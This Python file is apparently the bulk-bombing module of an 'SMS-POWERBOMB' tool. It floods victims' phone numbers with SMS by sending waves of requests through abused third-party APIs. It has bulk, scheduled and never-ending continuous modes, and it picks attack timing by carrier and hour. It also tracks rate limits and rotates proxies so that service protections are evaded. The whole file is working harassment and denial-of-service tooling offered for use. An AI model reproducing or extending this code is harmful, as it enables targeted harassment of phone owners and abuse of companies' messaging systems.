#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════════
# ☠️ SMS-POWERBOMB v8.0 - BULK BOMBING MODULE ☠️
# ═══════════════════════════════════════════════════════════════════
# Creator: RAJSARASWATI JATAV
# Team: RAJSARASWATI JATAV CYBER CREW
# ═══════════════════════════════════════════════════════════════════
# Bulk SMS Bombing - Multiple Targets Simultaneously
# ═══════════════════════════════════════════════════════════════════

import asyncio
import time
from typing import List, Dict
from collections import defaultdict
from datetime import datetime

class BulkBomber:
    """Bulk SMS bombing for multiple targets"""
    
    def __init__(self, engine):
        self.engine = engine
        self.targets = []
        self.results = defaultdict(lambda: {'success': 0, 'failed': 0})
    
    def add_target(self, phone: str, waves: int = 10):
        """Add a target to bulk bombing list"""
        self.targets.append({'phone': phone, 'waves': waves})
    
    def load_targets_from_file(self, filename: str):
        """Load targets from file (one phone per line)"""
        try:
            with open(filename, 'r') as f:
                for line in f:
                    phone = line.strip()
                    if phone and len(phone) == 10:
                        self.add_target(phone)
            return len(self.targets)
        except Exception as e:
            print(f"Error loading file: {e}")
            return 0
    
    async def bomb_target(self, target: Dict, session):
        """Bomb a single target"""
        phone = target['phone']
        waves = target['waves']
        
        for wave in range(waves):
            active_apis = self.engine.get_active_apis()
            tasks = [self.engine.send_sms_with_retry(session, api, phone) 
                    for api in active_apis]
            results = await asyncio.gather(*tasks)
            
            for name, success, message in results:
                if success:
                    self.results[phone]['success'] += 1
                else:
                    self.results[phone]['failed'] += 1
            
            await asyncio.sleep(2)  # Delay between waves
    
    async def start_bulk_bombing(self):
        """Start bombing all targets simultaneously"""
        import aiohttp
        
        print(f"\n🚀 Starting bulk bombing for {len(self.targets)} targets...")
        start_time = time.time()
        
        async with aiohttp.ClientSession() as session:
            tasks = [self.bomb_target(target, session) for target in self.targets]
            await asyncio.gather(*tasks)
        
        elapsed = time.time() - start_time
        
        # Print summary
        print(f"\n✅ Bulk bombing complete!")
        print(f"⏱️  Total time: {elapsed:.2f}s")
        print(f"\n📊 Results:")
        
        for phone, stats in self.results.items():
            total = stats['success'] + stats['failed']
            rate = (stats['success'] / total * 100) if total > 0 else 0
            print(f"  {phone}: {stats['success']}/{total} ({rate:.1f}%)")


class ScheduledBomber:
    """Schedule SMS bombing for future execution"""
    
    def __init__(self, engine):
        self.engine = engine
        self.scheduled_tasks = []
    
    def schedule_bombing(self, phone: str, waves: int, 
                        schedule_time: datetime):
        """Schedule a bombing task"""
        task = {
            'phone': phone,
            'waves': waves,
            'schedule_time': schedule_time,
            'status': 'pending'
        }
        self.scheduled_tasks.append(task)
        return len(self.scheduled_tasks) - 1
    
    async def execute_scheduled_tasks(self):
        """Execute all scheduled tasks"""
        while True:
            current_time = datetime.now()
            
            for task in self.scheduled_tasks:
                if task['status'] == 'pending':
                    if current_time >= task['schedule_time']:
                        print(f"\n⏰ Executing scheduled task for {task['phone']}")
                        task['status'] = 'running'
                        
                        # Execute bombing
                        # (Implementation would call the main bombing function)
                        
                        task['status'] = 'completed'
            
            await asyncio.sleep(60)  # Check every minute


class ContinuousBomber:
    """Continuous bombing mode - never stops"""
    
    def __init__(self, engine):
        self.engine = engine
        self.running = False
        self.total_sent = 0
    
    async def start_continuous(self, phone: str, delay: int = 5):
        """Start continuous bombing"""
        import aiohttp
        
        self.running = True
        print(f"\n♾️  Starting continuous bombing mode...")
        print(f"⚠️  Press Ctrl+C to stop\n")
        
        async with aiohttp.ClientSession() as session:
            wave = 0
            while self.running:
                wave += 1
                print(f"\n🔄 Wave {wave} - {datetime.now().strftime('%H:%M:%S')}")
                
                active_apis = self.engine.get_active_apis()
                tasks = [self.engine.send_sms_with_retry(session, api, phone) 
                        for api in active_apis]
                results = await asyncio.gather(*tasks)
                
                success = sum(1 for _, s, _ in results if s)
                self.total_sent += success
                
                print(f"✅ Sent: {success} | Total: {self.total_sent}")
                
                await asyncio.sleep(delay)
    
    def stop(self):
        """Stop continuous bombing"""
        self.running = False


class SmartTargetSelector:
    """AI-powered target selection and optimization"""
    
    def __init__(self, ai_engine):
        self.ai_engine = ai_engine
    
    def analyze_target(self, phone: str) -> Dict:
        """Analyze target and suggest best strategy"""
        carrier = self.detect_carrier(phone)
        
        # Get AI recommendations
        best_apis = []
        if self.ai_engine:
            from ai_engine import SmartAPISelector
            selector = SmartAPISelector(self.ai_engine)
            # Get carrier-specific best APIs
        
        return {
            'carrier': carrier,
            'recommended_mode': 'smart',
            'recommended_waves': 10,
            'best_time': 'now',
            'success_probability': 0.7
        }
    
    def detect_carrier(self, phone: str) -> str:
        """Detect carrier from phone number"""
        if not phone or len(phone) < 1:
            return 'Unknown'
        
        first_digit = phone[0]
        carrier_map = {
            '6': 'Vodafone/Vi',
            '7': 'Airtel/Jio',
            '8': 'Airtel/BSNL',
            '9': 'Jio/Airtel'
        }
        return carrier_map.get(first_digit, 'Unknown')
    
    def suggest_optimal_time(self, phone: str) -> str:
        """Suggest best time for bombing"""
        current_hour = datetime.now().hour
        
        if 9 <= current_hour <= 11:
            return "Morning (Good time)"
        elif 14 <= current_hour <= 17:
            return "Afternoon (Best time)"
        elif 19 <= current_hour <= 22:
            return "Evening (Good time)"
        else:
            return "Late night (Lower success rate)"


class RateLimitHandler:
    """Advanced rate limit detection and handling"""
    
    def __init__(self):
        self.rate_limits = defaultdict(lambda: {'count': 0, 'last_reset': time.time()})
        self.cooldown_periods = {}
    
    def check_rate_limit(self, api_name: str) -> bool:
        """Check if API is rate limited"""
        current_time = time.time()
        limit_data = self.rate_limits[api_name]
        
        # Reset counter every 60 seconds
        if current_time - limit_data['last_reset'] > 60:
            limit_data['count'] = 0
            limit_data['last_reset'] = current_time
        
        # Check if in cooldown
        if api_name in self.cooldown_periods:
            if current_time < self.cooldown_periods[api_name]:
                return False
        
        return True
    
    def record_attempt(self, api_name: str, rate_limited: bool):
        """Record API attempt"""
        self.rate_limits[api_name]['count'] += 1
        
        if rate_limited:
            # Put API in cooldown for 5 minutes
            self.cooldown_periods[api_name] = time.time() + 300
    
    def get_cooldown_status(self, api_name: str) -> Dict:
        """Get cooldown status for API"""
        if api_name in self.cooldown_periods:
            remaining = self.cooldown_periods[api_name] - time.time()
            if remaining > 0:
                return {
                    'in_cooldown': True,
                    'remaining_seconds': int(remaining)
                }
        
        return {'in_cooldown': False, 'remaining_seconds': 0}


class ProxyRotator:
    """Proxy rotation for better success rate"""
    
    def __init__(self):
        self.proxies = []
        self.current_index = 0
    
    def add_proxy(self, proxy: str):
        """Add proxy to rotation list"""
        self.proxies.append(proxy)
    
    def get_next_proxy(self) -> str:
        """Get next proxy in rotation"""
        if not self.proxies:
            return None
        
        proxy = self.proxies[self.current_index]
        self.current_index = (self.current_index + 1) % len(self.proxies)
        return proxy
    
    def load_proxies_from_file(self, filename: str):
        """Load proxies from file"""
        try:
            with open(filename, 'r') as f:
                for line in f:
                    proxy = line.strip()
                    if proxy:
                        self.add_proxy(proxy)
            return len(self.proxies)
        except Exception:
            return 0